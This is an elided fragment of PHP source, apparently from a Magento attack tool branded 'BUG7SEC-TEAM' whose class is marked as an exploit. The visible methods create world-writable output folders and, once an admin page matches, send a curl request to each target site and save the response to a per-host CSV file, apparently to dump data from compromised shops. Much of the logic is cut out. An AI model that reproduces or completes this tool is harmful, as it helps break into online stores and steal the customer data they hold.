...
class Magento //extends Exploit
{
	...
	public function check_required(){
		...
		if (!file_exists("BUG7SEC-TEAM")) {
			mkdir("BUG7SEC-TEAM",0777);
			mkdir("BUG7SEC-TEAM/".$this->saveCSV,0777);
		}
	}
	...
	public function saves($nama,$data){
      $myfile = fopen("BUG7SEC-TEAM/".$nama, "a+") or die("Unable to open file!");
      fwrite($myfile, $data);
      fclose($myfile);
   	}
	...
	public function admin($sites){
	    ...
	    if($matches[0][0]){
			...
			$out = curl_exec($ch);
			curl_close($ch);
			$fp = fopen("BUG7SEC-TEAM/".$this->saveCSV."/".parse_url($sites, PHP_URL_HOST).'.csv', 'w');
			fwrite($fp, $out);
			fclose($fp);
			if($fp){
